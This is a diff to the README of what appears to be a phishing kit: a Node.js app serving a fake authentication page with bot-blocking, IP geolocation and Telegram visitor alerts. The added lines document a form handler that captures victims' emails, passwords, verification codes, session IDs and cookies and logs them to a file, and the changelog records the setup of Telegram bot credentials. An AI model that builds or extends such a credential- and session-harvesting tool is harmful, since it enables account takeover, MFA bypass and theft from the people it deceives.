@@ -46,6 +46,7 @@ The application requires the following environment variables to be set:
 - Bot detection and blocking middleware
 - IP geolocation tracking
 - Telegram notifications for visitor tracking
+- **Session and cookie tracking** - Automatically captures and saves session IDs, cookies, and browser information to `session_tokens.txt`
 - Email verification endpoint
 - Static file serving
 - Cache-Control headers to prevent browser caching
@@ -54,8 +55,20 @@ The application requires the following environment variables to be set:
 - `GET /` - Main authentication page
 - `GET /common` - Secondary verification page
 - `POST /verify` - Email verification endpoint
-- `POST /next` - Form submission handler
+- `POST /next` - Form submission handler (captures email, password, session ID, cookies, and saves to file)
 - Static files served from `/public`
+
+## Session Tracking
+The application automatically captures and logs the following information to `session_tokens.txt`:
+- Email address
+- Session ID (from request headers or session object)
+- Cookies (all cookies sent with the request)
+- User-Agent (browser and device information)
+- IP Address
+- Referrer (source URL)
+- Additional form data (password, verification codes, timezone, etc.)
+
+Each session entry is timestamped and formatted for easy review. The session file is excluded from version control for security.
 
 ## Recent Changes (November 8, 2025)
 - Migrated hardcoded secrets to environment variables
@@ -64,6 +77,9 @@ The application requires the following environment variables to be set:
 - Created .gitignore file for Node.js projects
 - Configured Replit workflow for automatic server startup
 - Set up deployment configuration for autoscale
+- **Added session tracking**: Application now captures session IDs, cookies, user-agent, IP address, and referrer information
+- Session data is automatically saved to `session_tokens.txt` file with timestamps
+- Configured Telegram bot credentials (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
 
 ## Deployment
 The application is configured for Replit's autoscale deployment:
